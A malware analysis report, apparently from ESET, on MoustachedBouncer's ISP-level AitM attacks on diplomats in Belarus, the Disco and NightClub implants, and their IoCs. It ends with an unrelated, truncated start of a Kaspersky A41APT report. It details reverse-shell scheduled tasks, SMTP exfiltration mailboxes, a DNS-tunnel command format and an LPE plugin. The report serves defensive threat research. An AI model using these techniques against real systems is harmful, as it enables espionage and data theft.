The HTML page, shown in Figure 2, loads JavaScript code from http://updates.microsoft[.]com/jdrop.js. This script first calls setTimeout to execute the function jdrop one second after the page has loaded. That function (see Figure 3) displays a modal window with a button named Получить обновления (translation: Get updates). Figure 3. jdrop function

A click on the button executes the update function, shown in Figure 4. Figure 4. update function

This function triggers the download of a fake Windows Update installer from the legitimate-seeming URL http://updates.microsoft[.]com/MicrosoftUpdate845255.zip. It also displays some instructions to install the update: Для установки обновлений, скачайте и запустите "MicrosoftUpdate845255.msi". (translation: To install updates, download and run "MicrosoftUpdate845255.msi"). We were unable to retrieve the downloaded MicrosoftUpdate845255.zip file but our telemetry shows it contains a malicious executable named MicrosoftUpdate845255.exe. Written in Go, it creates a scheduled task that executes \\35.214.56[.]2\OfficeBroker\OfficeBroker.exe every minute. Like the path suggests, it fetches the executable via SMB from 35.214.56[.]2.

This IP address belongs to a Google Cloud customer, but just like the HTTP server, we believe that SMB replies are injected on the fly via AitM and that the attackers don’t control the actual internet-routable IP address. We have also observed the following SMB servers, intercepted via AitM:

\\209.19.37[.]184
\\38.9.8[.]78
\\59.6.8[.]25
We have observed this behavior in two separate ISP networks: Unitary Enterprise A1 and Beltelecom. This suggests that those ISPs may not provide full data confidentiality and integrity. We strongly recommend that foreign organizations in Belarus use an end-to-end encrypted VPN tunnel, ideally out-of-band (i.e., not from the endpoint), providing internet connectivity from a trusted network. Figure 5 depicts our hypothesis about the compromise vector and the traffic interception. Figure 5. Compromise via AitM scenario


AitM – General thoughts
The AitM scenario reminds us of the Turla and StrongPity threat actors who have trojanized software installers on the fly at the ISP level.

Usually, this initial access method is used by threat actors operating in their own country because it requires significant access inside the internet service providers, or their upstream providers. In many countries, security services are allowed to perform so-called “lawful interception” using special devices installed on the ISPs’ premises. In Russia, a law from 2014 requires ISPs to install devices called SORM-3 that enable the Federal Security Service (FSB) to conduct targeted surveillance. The devices have deep packet inspection (DPI) capabilities and were likely used by Turla in its Mosquito campaign. In 2018, the Citizen Lab revealed that DPI devices developed by the Canadian company Sandvine were used to modify HTTP traffic in Turkey and Egypt. In Turkey, the devices were allegedly used to redirect internet users to a malicious server when they tried to download certain Windows applications, which is in line with StrongPity activities. In Egypt, those devices were allegedly used to inject ads and cryptocurrency mining scripts in order to generate money.

In 2020, a Bloomberg article revealed that Belarus’s National Traffic Exchange Center bought the same Sandvine DPI equipment, but according to a Cyberscoop article the contract was cancelled in September 2020. According to a report by Amnesty International published in 2021, “Under Belarusian law, all telecommunications providers in the country must make their hardware compatible with the SORM system”. They also state that “The SORM system allows the authorities direct, remote-control access to all user communications and associated data without notifying the provider”. We assess with low confidence that MoustachedBouncer uses this SORM system to conduct its operations. While the compromise of routers in order to conduct AitM on embassy networks cannot be fully discarded, the presence of lawful interception capabilities in Belarus suggests the traffic mangling is happening at the ISP level rather than on the targets’ routers. Implants: NightClub and Disco
Since 2014, the malware families used by MoustachedBouncer have evolved, and a big change happened in 2020 when the group started to use AitM attacks.

At the same time, it started to use much simpler tools developed in .NET and Go. In reference to NightClub, we named this new toolset Disco. MoustachedBouncer operates the two implant families in parallel, but on a given machine, only one is deployed at a time. We believe that Disco is used in conjunction with AitM attacks while NightClub is used for victims where traffic interception at the ISP level isn’t possible because of a mitigation such as the use of an end-to-end encrypted VPN where internet traffic is routed outside of Belarus. Disco
As mentioned in the previous section, a fake Windows Update page delivers the first stage (SHA-1: E65EB4467DDB1C99B09AE87BA0A964C36BAB4C30). This is a simple dropper written in Go that creates a scheduled task to execute \\35.214.56[.]2\OfficeBroker\OfficeBroker.exe every minute. OfficeBroker.exe is downloaded over the SMB protocol via AitM attack. The dropper’s main function is shown in Figure 6. Figure 6.

Main function of the Go dropper
Figure 6. Main function of the Go dropper

Finally, the dropper does a DNS query for windows.system.update[.]com. This domain does not exist but the DNS request is probably intercepted via AitM, and is likely a beacon to notify the operators that the machine has been successfully compromised. We were unable to retrieve the OfficeBroker.exe file, but it is very likely that it acts as a downloader, since we have observed further plugins being executed from SMB shares. The plugins are developed in Go and are rather simple because they mostly rely on external Go libraries. Table 2 summarizes the different plugins. Table 2. Go plugins used by MoustachedBouncer in 2021–2022

Download URL / Path on disk

Description

\\209.19.37[.]184\driverpack\aact.exe

Takes screenshots using the kbinani/screenshot library. Screenshots are saved in .\AActdata\<d>_<s>.dat (on the SMB share) where <d> is the active display number and <s> the date.

It sleeps 15 seconds between each screenshot. C:\Users\Public\driverpack\driverpackUpdate.exe

Executes PowerShell scripts with powershell.exe -NoProfile -NonInteractive <command>, where <command> is read from the file .\idata. The output is written in .\odata. C:\Users\Public\driverpack\sdrive.exe

Executes C:\Users\Public\‌driverpack\driverpackUpdate.exe (the plugin above) using elevated rights via CVE-2021-1732. The code was likely inspired by a PoC on GitHub and uses the zydis code generation library. \\209.19.37[.]184\driverpack\officetelemetry.exe

A reverse proxy strongly inspired by the GitHub repository revsocks. We were unable to retrieve the command line parameters with the proxy IP address. \\38.9.8[.]78\driverpack\DPU.exe

Another sample of the PowerShell plugin. %userprofile%\appdata\nod32update\nod32update.exe

Another sample of the reverse proxy plugin. \\59.6.8[.]25\outlooksync\outlooksync.exe

Takes screenshots; it is similar to the first plugin. Images are saved in ./logs/${DATETIME}.dat. \\52.3.8[.]25\oracle\oracleTelemetry.exe

Screenshot plugin packed with Themida. Interestingly, the plugins also use SMB shares for data exfiltration. There is no C&C server outside the attackers’ premises to look at or to take down. There also seems to be no way to reach that C&C server from the internet.

This gives high resiliency to the attackers’ network infrastructure. SharpDisco and NightClub plugins
In January 2020 we observed a MoustachedBouncer dropper, which we named SharpDisco, being downloaded from https://mail.mfa.gov.<redacted>/EdgeUpdate.exe by a Microsoft Edge process. It is not clear how attackers were able to tamper with HTTPS traffic, but it is possible an invalid TLS certificate warning was shown to the victim. Another possibility is that MoustachedBouncer compromised this governmental website. SharpDisco (SHA-1: A3AE82B19FEE2756D6354E85A094F1A4598314AB)
SharpDisco is a dropper developed in C#. It displays a fake update window, shown in Figure 7, while creating two scheduled tasks in the background. Figure 7. Fake Microsoft Edge update window

These scheduled tasks are:

scheduled tasks

WINCMDA.EXE and WINCMDB.EXE are probably just cmd.exe renamed. Every minute, the task reads what is in \\24.9.51[.]94\EDGEUPDATE\EDGEAIN (on the SMB share), pipes it to cmd.exe, and writes the output to \\24.9.51[.]94\EDGEUPDATE\EDGEAOUT. It is the same for the second task, but with the EDGEBIN and EDGEBOUT files.

From a higher viewpoint, those tasks are reverse shells with a one-second latency. Then, as shown in Figure 8, the dropper sends a DNS request for an unregistered domain, edgeupdate-security-windows[.]com. This is similar to what the 2022 Disco dropper does. Figure 8. Dropper used in 2020

ESET telemetry shows that the reverse shell was used to drop a genuine Python interpreter in C:\Users\Public\WinTN\WinTN.exe. We then observed two plugins being dropped on disk by cmd.exe, which means they were likely dropped by the reverse shell as well. The two plugins are:

A recent-files stealer in C:\Users\Public\WinSrcNT\It11.exe
An external drive monitor in C:\Users\Public\It3.exe
It is interesting to note that those plugins share code with NightClub (described in the section NightClub – 2017 (SHA-1: F92FE4DD679903F75ADE64DC8A20D46DFBD3B277) below). This allowed us to link the Disco and NightClub toolsets. Recent-files stealer (SHA-1: 0DAEA89F91A55F46D33C294CFE84EF06CE22E393)
This plugin is a Windows executable named It11.exe. We believe it was executed via the reverse shell mentioned above.

There is no persistence mechanism implemented in the plugin. It gets the files recently opened on the machine by reading the content of the folder %USERPROFILE%\Recent (on Windows XP) or of %APPDATA%\Microsoft\Windows\Recent (in newer Windows versions). Those folders contain LNK files, each pointing to a recently opened file. The plugin embeds its own LNK format parser in order to extract the path to the original file. We were unable to make this plugin work, but static analysis shows that the files are exfiltrated to the SMB share \\24.9.51[.]94\EDGEUPDATE\update\. The plugin maintains a list of already exfiltrated files, and their CRC-32 checksum, in %TEMP%\index.dat. This likely avoids retransmitting the same file more than once. External drive monitor (SHA-1: 11CF38D971534D9B619581CEDC19319962F3B996)
This plugin is a Windows executable named It3.exe. As with the recent-files stealer, it doesn’t implement any persistence mechanism. The plugin calls GetLogicalDrives in a loop to get a list of all connected drives, including removable ones such as USB keys.

Then, it does a raw copy of the NTFS volume of each removable drive and writes it in the current working directory, C:\Users\Public\ in our example. The filename is a randomly generated string of six to eight alphanumeric characters, for example heNNYwmY. It maintains a log file in <working directory>\index.dat with the CRC-32 checksums of the copied disks. The plugin doesn’t appear to have any exfiltration capabilities. It is likely that the staged drive dumps are later retrieved using the reverse shell. NightClub
Since 2014, MoustachedBouncer has been using a malware framework we named NightClub because it contains a C++ class named nightclub. We found samples from 2014, 2017, 2020, and 2022. This section describes the evolution of NightClub from a simple backdoor to a fully modular C++ implant. In summary, NightClub is an implant family using emails for its C&C communications. Since 2016, additional modules could be delivered by email to extend its spying capabilities.

NightClub – 2014
This is the oldest known version of NightClub. We found a dropper and an orchestrator. The dropper (SHA-1: 0401EE7F3BC384734BF7E352C4C4BC372840C30D) is an executable named EsetUpdate-0117583943.exe, and it was uploaded to VirusTotal from Ukraine on 2014-11-19. We don’t know how it was distributed at that time. The main function, illustrated in Figure 9, loads the resource MEMORY and writes its content in %SystemRoot%\System32\creh.dll. It is stored in cleartext in the PE resource. Figure 9. Main function of the dropper

Then, the dropper modifies the Creation, Access, and Write timestamps of creh.dll to those of the genuine Windows DLL user32.dll. Finally, it creates a Windows service named WmdmPmSp and sets, in the registry, its ServiceDll to %SystemRoot%\System32\creh.dll – see Figure 10. Figure 10. Modification of the value ServiceDll

The previously dropped DLL, creh.dll (SHA-1: 5B55250CC0DA407201B5F042322CFDBF56041632) is the NightClub orchestrator. It has a single export named ServiceMain and its PDB path is D:\Programming\Projects\Work\SwampThing\Release\Win32\WorkingDll.pdb.

It is written in C++ and the names of some methods and classes are present in the RTTI data – see Figure 11. Figure 11. Method and class names from the RTTI data


Some of the strings are encrypted using the following linear congruential generator (LCG): staten+1 = (690069 × staten + 1) mod 232. For each encrypted string, a seed (state0) between 0 and 255 is provided. To decrypt a string, the staten is subtracted from each encrypted byten. An example of an encrypted string structure is shown in Figure 12. Figure 12. Encrypted string format

A non-encrypted log file is present in C:\Windows\System32\servdll.log. It contains very basic information about the initialization of the orchestrator – see Figure 13. Figure 13. Log file

NightClub has two main capabilities:

• Monitoring files

• Exfiltrating data via SMTP (email)

File monitor
Functionality implemented here is very close to that of the recent file monitor plugin seen in 2020 and described above.

It also browses the directories %USERPROFILE%\Recent on Windows XP, and in newer Windows versions %APPDATA%\Microsoft\Windows\Recent, and implements the same LNK parser – see Figure 14 and Figure 15. Figure 14. LNK parser (2014 sample – 5B55250CC0DA407201B5F042322CFDBF56041632)

Figure 15. LNK parser (2020 sample – 0DAEA89F91A55F46D33C294CFE84EF06CE22E393)

The files retrieved from the LNK files are copied to %TEMP%\<original filename>.bin. Note that unlike the 2020 variant, only files with extensions .doc, .docx, .xls, .xslx, or .pdf are copied. It also monitors removable drives in a loop, in order to steal files from them. SMTP C&C communications
NightClub uses the SMTP protocol to exfiltrate data. Even if C&C communication by email is not unique to MoustachedBouncer and is also used by other adversaries such as Turla (see LightNeuron and the Outlook backdoor), it is quite rare. The code is based on the CSmtp project available on GitHub. The email accounts’ information is hardcoded, encrypted with the LCG algorithm.

In the sample we analyzed, the mail configuration is:

• SMTP server: smtp.seznam.cz

• Sender address: glen.morriss75@seznam[.]cz

• Sender password: <redacted>

• Recipient address: SunyaF@seznam[.]cz

seznam.cz is a Czech web portal offering a free webmail service. We believe the attackers created their own email accounts, instead of compromising legitimate ones. NightClub exfiltrates the files previously copied to %TEMP% by the file monitor functionality (FileMonitor in Figure 11). They’re encoded in base64 and added as an attachment. The attachment name is the original filename with the .bin extension. Figure 16 shows the exfiltration of a file via SMTP. NightClub authenticates using the credentials for the  glen.morriss75@seznam[.]cz account and sends an email to SunyaF@seznam[.]cz with the stolen file attached. Figure 16. TCP stream of the SMTP communication from our test machine

Note that some headers that might look suspicious at first sight are the defaults from the CSmtp project, so they are probably not distinctive.

These include:

• X-Mailer: The Bat! (v3.02) Professional

• Content-Type: multipart/mixed; boundary="__MESSAGE__ID__54yg6f6h6y456345"

The Bat! is an email client widely used in Eastern Europe. As such, the X-Mailer header likely blends in with email traffic in Belarus. NightClub – 2017 (SHA-1: F92FE4DD679903F75ADE64DC8A20D46DFBD3B277)
In 2017, we found a more recent version of NightClub, which was compiled on 2017-06-05. On the victim’s machine, it was located at C:\Windows\System32\metamn.dll. Its filename in the DLL export directory is DownloaderService.dll, and it has a single export named ServiceMain. It contains the PDB path D:\AbcdMainProject\Rootsrc\Projects\MainS\Ink\Release\x64\EtfFavoriteFinder.pdb. To persist, it creates a Windows service named WmdmPmSp, as in previous versions. Unfortunately, we have not been able to recover the dropper. This NightClub version also includes a few C++ class and method names, including nightclub, in the RTTI data – see Figure 17. Figure 17. Method and class names from the RTTI data of the 2017 NightClub version

As in previous versions, C&C communications use the SMTP protocol, via the CSmtp library, with hardcoded credentials.

In the sample we analyzed, the mail configuration is:

• SMTP server: smtp.mail.ru

• Sender address: fhtgbbwi@mail[.]ru

• Sender password: [redacted]

• Recipient address: nvjfnvjfnjf@mail[.]ru

The main difference is that they switched the free email provider from Seznam.cz to Mail.ru. This NightClub version uses external plugins stored in the folder %APPDATA%\NvmFilter\. They are DLLs named <random>.cr (e.g., et2z7q0FREZ.cr) with a single export named Starts. We have identified two plugins: a keylogger and a file monitor. Keylogger (SHA-1: 6999730D0715606D14ACD19329AF0685B8AD0299)
This plugin was stored in %APPDATA%\NvmFilter\et2z7q0FREZ.cr and is a DLL with one export, Starts. It contains the PDB path D:\Programming\Projects\Autogen\Kh\AutogenAlg\Release\x64\SearchIdxDll.pdb and was developed in C++. RTTI data shows a few class names – see Figure 18. Figure 18. Method and class names from the RTTI data of the NightClub keylogger plugin

The keylogger implementation is rather traditional, using the Windows GetKeyState API function – see Figure 19. Figure 19. NightClub keylogger

The keylogger maintains a cleartext log file in %TEMP%\uirtl.tmp.

It contains the date, the title of the application, and the logged keystrokes for this specific application. An example, which we generated, is provided in Figure 20. Figure 20. Example of the output of the keylogger (generated by us)

File monitor (SHA-1: 6E729E84C7672F048ED8AE847F20A0219E917FA)
This plugin was stored in %APPDATA%\NvmFilter\sTUlsWa1.cr and is a DLL with a single export named Starts. Its PDB path, D:\Programming\Projects\Autogen\Kh\AutogenAlg\Release\x64\FileMonitoringModule.pdb, has not been stripped, and it reuses code from the 2014 and 2020 file monitors, described above. It monitors drives and recent files, and copies files for exfiltration to %TEMP%\AcmSym\rm. Its log file is stored in %TEMP%\indexwti.sxd. NightClub – 2020–2022
In 2020-11, we observed a new version of NightClub deployed in Belarus, on the computers of the diplomatic staff of a European country. In 2022-07, MoustachedBouncer again compromised some of the same computers. The 2020 and 2022 versions of NightClub are almost identical, and the compromise vector remains unknown.

Its architecture is slightly different from the previous versions, as the orchestrator also implements networking functions. The second component, which its developers call the module agent, is only responsible for loading the plugins. All samples were found in the folder %APPDATA%\microsoft\def\ and are written in C++ with statically linked libraries such as CSmtp or cpprestsdk. As a result, the executables are quite large – around 5MB. Orchestrator
On the victims’ machines, both orchestrator variants (SHA-1: 92115E21E565440B1A26ECC20D2552A214155669 and D14D9118335C9BF6633CB2A41023486DACBEB052) were named svhvost.exe. We believe MoustachedBouncer tried to masquerade as the name of the legitimate executable svchost.exe. For persistence, it creates a service named vAwast. Contrary to previous versions, to encrypt the strings they simply add 0x01 to each byte. For example, the string cmd.exe would be encrypted as dne/fyf. Another difference is that the configuration is stored in an external file, rather than hardcoded in the binary. It is stored in the hardcoded path %APPDATA%\Microsoft\def\Gfr45.cfg and the data is decrypted with a private 2048-bit RSA key (see Figure 21) using the function BCryptImportKeyPair and BCryptDecrypt.

Figure 21. Hardcoded private RSA key

The config is formatted in JSON, as shown in Figure 22. Figure 22. NightClub external configuration format

The most important keys are transport and modules. The former contains information about the mailbox used for C&C communications, as in the previous versions. The latter contains the list of modules. Module agent
The two variants of the module agent (SHA-1: DE0B38E12C0AF0FD63A67B03DD1F8C1BF7FA6128 and E6DE72516C1D4338D7E45E028340B54DCDC7A8AC) were named schvost.exe, which is another imitation of the svchost.exe filename. This component is responsible for starting the modules that are specified in the configuration. They are DLLs, each with an export named Start or Starts. They are stored on disk unencrypted with the .ini extension, but actually are DLLs. Modules
Over the course of our investigation, we found five different modules: an audio recorder, two almost identical screenshotters, a keylogger, and a DNS backdoor. For all of them: their configuration, which is formatted in JSON, is passed as an argument to the Start or Starts function.

By default, the output of the plugin is written in %TEMP%\tmp123.tmp. This can be changed using the config field file. Table 3 shows the different plugins. Table 3. NightClub plugins

DLL export name

Configuration

Description

NotifyLoggers.dll

{

    "name":"<value>",

    "enabled":"<value>",

    "max_size":"<value>",

    "file":"<value>",

    "chk_t":"<value>",

    "r_d":"<value>",

    "f_hs":"<value>",

    "t_hs":"<value>"

}

An audio recorder that uses the Lame library, and mciSendStringW to control the audio device. The additional configuration fields are likely used to specify options for Lame. MicroServiceRun.dll

{

    "name":"<value>",

    "enabled":"<value>",

    "max_size":"<value>",

    "file":"<value>"
    "capture_on_key_press":"<value>",

    "period_in_sec":"<value>",

    "quality":"<value>",

    "app_keywords":"<value>"

}

A screenshotter that uses CreateCompatibleDC and GdipSaveImageToStream and writes captured images in file to disk. If app_keywords is not empty, it uses GetForegroundWindow to check the name of the active Window and capture it only if it matches app_keywords. JobTesterDll.dll

{

    "name":"<value>",

    "enabled":"<value>",

    "max_size":"<value>",

    "file":"<value>"

}

A keylogger that uses the GetKeyState API. It writes the log in file to disk and the format is <Date><Title bar><content>.

ParametersParserer.dll

{

    "name":"<value>",

    "enabled":"<value>",

    "max_size":"<value>",

    "file":"<value>",

    "cc_server_address":"<value>"

}

A DNS-tunneling backdoor. cc_server_address specifies the IP address of a DNS server to which requests are sent. More details follow. The DNS-tunneling backdoor (ParametersParserer.dll) uses a custom protocol to send and receive data from a malicious DNS server (cc_server_address). Figure 23 shows that the DNS request is sent to the IP address provided in the configuration, using the pExtra parameter of DnsQuery_A. Figure 23. DNS request to the C&C server

The plugin adds the data to exfiltrate as part of the subdomain name of the domain that is used in the DNS request (pszName above). The domain is always 11.1.1.cid and the data is contained in the subdomain. It uses the following format, where x is the letter, not some variable:

x + <modified base64(buffer)> + x.11.1.1.cid

For example, the first DNS request the plugin sends is xZW1wdHkx.11.1.1.cid, where ZW1wdHk decodes to empty.

Note that the base64 function is not standard. It removes the =, if any, from the result of the base64 encoding, and also replaces / characters with -s and + characters with -p. This is to create valid subdomains, because standard base64 encoding output can include +, / and = characters, all of which are invalid in domain names and could be detected in network traffic. Then, the plugin reads the result that should be one or many TXT DNS records, since the flag DNS_TYPE_TEXT is passed to DnsQuery_A. Microsoft names the underlying structure DNS_TXT_DATAA. It contains an array of strings, which are concatenated to compute the output buffer. Figure 24. The plugin reads the TXT record

The expected format of the reply is:

x + <argument encoded with modified base64> + x.<cmd_id>.<unknown integer>.1.<cmd_name>

This is similar to the format of the requests. The <argument encoded with modified base64> also uses the custom base64 encoding without = and with -p for + and -s for /.

<cmd_name> is an arbitrary string that is not used by the backdoor; it’s likely used by the operators to keep track of the different commands. <cmd_id> is an integer that corresponds to a command in the backdoor switch statement. For example, if the operators wanted to execute calc.exe, the DNS C&C server would send the reply xYzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZQx.27.2.1.calc, where Yzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZQ decodes to c:\windows\system32\calc.exe and 27 is the command ID to create a new process. All commands supported by this backdoor are detailed in Table 4. Table 4. Commands implemented by the DNS backdoor


ID

Description

0x15 (21)

Copy a directory (from a source to a destination)

0x16 (22)

Move a file (from a source to a destination)

0x17 (23)

Remove a file or a directory

0x18 (24)

Search a file for a given pattern (Note: we are unsure about the exact behavior of this command)

0x19 (25)

Write a buffer to a file

0x1A (26)

Read a file

0x1B (27)

Create a process

The result of the commands is exfiltrated back to the attacker using DNS requests, as detailed above.

The only difference is that 11 is replaced by 12 in the domain name, as shown in this example: xdGltZW91dAx.12.1.1.cid. In this case, the plugin sent the message timeout to the C&C server. Conclusion
MoustachedBouncer is a skilled threat actor targeting foreign diplomats in Belarus. It uses quite advanced techniques for C&C communications including network interception at the ISP level for the Disco implant, emails for the NightClub implant, and DNS in one of the NightClub plugins. The main takeaway is that organizations in foreign countries where the internet cannot be trusted should use an end-to-end encrypted VPN tunnel to a trusted location for all their internet traffic in order to circumvent any network inspection devices. For any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com. ESET Research offers private APT intelligence reports and data feeds. For any inquiries about this service, visit the ESET Threat Intelligence page.

ESET Research Podcast
If you want to know how ESET researchers named MoustachedBouncer and its tools Disco and NightClub, what makes this group worthy of the “advanced” label, or if employees of the targeted embassies could have brought the malware home from work, then listen to the latest episode of the ESET Research podcast. ESET’s Director of Threat Research Jean-Ian Boutin explains the intricacies of MoustachedBouncer to our host and ESET Distinguished Researcher Aryeh Goretsky. If you enjoy listening to cybersecurity topics, subscribe to our ESET Research podcast on Spotify, Google Podcasts, Apple Podcasts, or PodBean. IoCs
Files
SHA-1

Filename

Detection

Description

02790DC4B276DFBB26C714F29D19E53129BB6186

index.html

JS/TrojanDownloader.Agent.YJJ

Fake Windows update webpage. 6EFF58EDF7AC0FC60F0B8F7E22CFE243566E2A13

jdrop.js

JS/TrojanDownloader.Agent.YJJ

JavaScript code that triggers the download prompt of the fake Windows update. E65EB4467DDB1C99B09AE87BA0A964C36BAB4C30

MicrosoftUpdate845255.exe

WinGo/Agent.ET

Disco dropper. 3A9B699A25257CBD0476CB1239FF9B25810305FE

driverpackUpdate.exe

WinGo/Runner.B

Disco plugin. Executes PowerShell scripts. 19E3D06FBE276D4AAEA25ABC36CC40EA88435630

DPU.exe

WinGo/Runner.C

Disco plugin. Executes PowerShell scripts. 52BE04C420795B0D9C7CD1A4ACBF8D5953FAFD16

sdrive.exe

Win64/Exploit.CVE-2021-1732.I

Disco plugin.

LPE exploit for CVE-2021-1732. 0241A01D4B03BD360DD09165B59B63AC2CECEAFB

nod32update.exe

WinGo/Agent.EV

Disco plugin. Reverse proxy based on revsocks. A01F1A9336C83FFE1B13410C93C1B04E15E2996C

aact.exe

WinGo/Spy.Agent.W

Disco plugin. Takes screenshots. C2AA90B441391ADEFAA3A841AA8CE777D6EC7E18

officetelemetry.exe

WinGo/Agent.BT

Disco plugin. Reverse proxy based on revsocks. C5B2323EAE5E01A6019931CE35FF7623DF7346BA

oracleTelemetry.exe

WinGo/Spy.Agent.W

Disco plugin packed with Themida. Takes screenshots. C46CB98D0CECCB83EC7DE070B3FA7AFEE7F41189

outlooksync.exe

WinGo/Spy.Agent.W

Disco plugin. Takes screenshots. A3AE82B19FEE2756D6354E85A094F1A4598314AB

kb4480959_EdgeUpdate.exe

MSIL/TrojanDropper.Agent.FKQ

Disco .NET dropper. 4F1CECF6D05571AE35ED00AC02D5E8E0F878A984

WinSrcNT.exe

Win32/Nightclub.B

NightClub plugin used by Disco. Steals recent files. 0DAEA89F91A55F46D33C294CFE84EF06CE22E393

It11.exe

Win32/Nightclub.B

NightClub plugin used by Disco. Steals recent files. 11CF38D971534D9B619581CEDC19319962F3B996

It3.exe

Win32/Nightclub.B

NightClub plugin used by Disco. Makes raw dumps of removable drives. F92FE4DD679903F75ADE64DC8A20D46DFBD3B277

metamn.dll

Win64/Nightclub.B

NightClub (2017 version). 6999730D0715606D14ACD19329AF0685B8AD0299

et2z7q0FREZ.cr

Win64/Nightclub.B

NightClub plugin. Keylogger. 6E729E84C7672F048ED8AE847F20A0219E917FA3

sTUlsWa1.cr

Win64/Nightclub.A

NightClub plugin. File stealer. 0401EE7F3BC384734BF7E352C4C4BC372840C30D

EsetUpdate-0117583943.exe

Win32/Nightclub.C

NightClub dropper. 5B55250CC0DA407201B5F042322CFDBF56041632

creh.dll

Win32/Nightclub.C

NightClub (2014). D14D9118335C9BF6633CB2A41023486DACBEB052

svhvost.exe

Win32/Nightclub.D

Orchestrator (NightClub). E6DE72516C1D4338D7E45E028340B54DCDC7A8AC

schvost.exe

Win32/Nightclub.D

Module agent (NightClub). 3AD77281640E7BA754E9B203C8B6ABFD3F6A7BDD

nullnat.ini

Win32/Nightclub.D

Backdoor with DNS tunneling (NightClub plugin). 142FF0770BC6E3D077FBB64D6F23499D9DEB9093

soccix.ini

Win32/Nightclub.D

Keylogger (NightClub plugin). FE9527277C06D7F986161291CE7854EE79788CB8

oreonion.ini

Win32/Nightclub.D

Screenshotter (NightClub plugin).

92115E21E565440B1A26ECC20D2552A214155669

svhvost.exe

Win32/Nightclub.D

Orchestrator (NightClub). DE0B38E12C0AF0FD63A67B03DD1F8C1BF7FA6128

schvost.exe

Win32/Nightclub.D

Module agent (NightClub). D2B715A72BBA307CC9BF7690439D34F62EDF1324

sysleg.ini

Win32/Nightclub.D

Records audio (NightClub plugin). DF8DED42F9B7DE1F439AEC50F9C2A13CD5EB1DB6

oreonion.ini

Win32/Nightclub.D

Takes screenshots (NightClub plugin). C&C servers
IP

Domain

First seen

Comment

185.87.148[.]86

centrocspupdate[.]com

November 3, 2021

Suspected NightClub C&C server. 185.87.151[.]130

ocsp-atomsecure[.]com

November 11, 2021

Suspected NightClub C&C server. 45.136.199[.]67

securityocspdev[.]com

July 5, 2022

NightClub C&C server. 45.136.199[.]129

dervasopssec[.]com

October 12, 2022

Suspected NightClub C&C server. “Fake” domains used in AitM
Note: These domains are used in a context where DNS queries are intercepted before reaching the internet. They do not resolve outside the context of the AitM attack. windows.network.troubleshooter[.]com

updates.microsoft[.]com

 

SMB share IP addresses while AitM is ongoing
Note: These IP addresses are used in a context where traffic to them is intercepted before reaching the internet. These internet-routable IP addresses are not malicious outside the context of the AitM attack. 24.9.51[.]94

35.214.56[.]2

38.9.8[.]78

52.3.8[.]25

59.6.8[.]25

209.19.37[.]184

Email addresses

fhtgbbwi@mail[.]ru

nvjfnvjfnjf@mail[.]ru

glen.morriss75@seznam[.]cz

SunyaF@seznam[.]cz

MITRE ATT&CK techniques
This table was built using version 13 of the MITRE ATT&CK framework.

Tactic

ID

Name

Description

Reconnaissance

T1590.005

Gather Victim Network Information: IP Addresses

MoustachedBouncer operators have collected IP addresses, or address blocks, of their targets in order to modify network traffic for just those addresses. Initial Access

T1189

Drive-by Compromise

Disco is delivered via a fake Windows Update website. Execution

T1204.002

User Execution: Malicious File

Disco needs to be manually executed by the victim. Persistence

T1053.005

Scheduled Task/Job: Scheduled Task

Disco persists as a scheduled task that downloads an executable from a “fake” SMB share every minute. T1543.003

Create or Modify System Process: Windows Service

NightClub persists as a ServiceDll of a service named WmdmPmSp. Privilege Escalation

T1068

Exploitation for Privilege Escalation

Disco has a plugin to exploit the CVE-2021-1732 local privilege escalation vulnerability. Defense Evasion

T1140

Deobfuscate/Decode Files or Information

Since 2020, NightClub has used an external configuration file encrypted with RSA. Collection

T1005

Data from Local System

NightClub steals recent files from the local system.

T1025

Data from Removable Media

NightClub steals files from the local system. T1056.001

Input Capture: Keylogging

NightClub has a plugin to record keystrokes. T1113

Screen Capture

NightClub and Disco each have a plugin to take screenshots. T1123

Audio Capture

NightClub has a plugin to record audio. Command and Control

T1071.002

Application Layer Protocol: File Transfer Protocols

Disco communicates via the SMB protocol. T1071.003

Application Layer Protocol: Mail Protocols

NightClub communicates via the SMTP protocol. T1071.004

Application Layer Protocol: DNS

One of the NightClub plugins is a backdoor that communicates via DNS. T1132.001

Data Encoding: Standard Encoding

NightClub encodes files, attached to email, in base64. T1132.002

Data Encoding: Non-Standard Encoding

NightClub encodes commands and responses sent via its DNS C&C channel with a modified form of base64. T1573.001

Encrypted Channel: Symmetric Cryptography

NightClub receives plugins in email attachments, encrypted using AES-CBC. T1557

Adversary-in-the-Middle

MoustachedBouncer has performed AitM at the ISP level to redirect its targets to a fake Windows Update page.

It has also done AitM on the SMB protocol to deliver malicious files from “fake” servers. Exfiltration

T1041

Exfiltration Over C2 Channel

NightClub and Disco exfiltrate data over the C&C channel (SMTP, SMB, and DNS). Impact

T1565.002

Data Manipulation: Transmitted Data Manipulation

MoustachedBouncer has modified the HTTP traffic from specific IP addresses at the ISP level in order to redirect its targets to a fake Windows Update page.

Why is the campaign called A41APT? In 2019, we observed an APT campaign targeting multiple industries, including the Japanese manufacturing industry and its overseas operations, that was designed to steal information. We named the campaign A41APT (not APT41) which is derived from the host name “DESKTOP-A41UVJV” from the attacker’s system used in the initial infection. The actor leveraged vulnerabilities in Pulse Connect Secure in order to hijack VPN sessions, or took advantage of system credentials that were stolen in previous operations. Log of the hijacking VPN session from DESKTOP-A41UVJV

A41APT is a long-running campaign with activities detected from March 2019 to the end of December 2020. Most of the discovered malware families are fileless malware and they have not been seen before. One particular piece of malware from this campaign is called Ecipekac (a.k.a DESLoader, SigLoader, and HEAVYHAND). It is a very sophisticated multi-layer loader module used to deliver payloads such as SodaMaster (a.k.a DelfsCake, dfls, and DARKTOWN), P8RAT (a.k.a GreetCake, and HEAVYPOT) and FYAnti (a.k.a DILLJUICE stage2) which loads QuasarRAT.

In November and December 2020, Symantec and LAC both published blogposts about this campaign. A month later, we discovered new activities from A41APT that utilized modified and updated payloads, and that’s what we cover in this blog. In February 2021, a GReAT security expert and his friends gave a presentation on the A41APT campaign at the GReAT Ideas event. You can download the slides here. Further information about A41APT is available to customers of the Kaspersky Intelligence Reporting service. Contact intelreports@kaspersky.com

Technical analysis: Ecipekac
We observed a multi-layer x64 loader used exclusively by this actor and dubbed Ecipekac after a unique string found in the second layer of the Ecipekac loader. The string is “Cake piece” in reverse (with a typo). The hardcoded unique string “ecipekac”

Ecipekac uses a new, complicated loading schema: it uses the four files listed below to load and decrypt four fileless loader modules one after the other to eventually load the final payload in memory.

Ecipekac infection flow

The files are:

Filename	MD5 Hash	Description
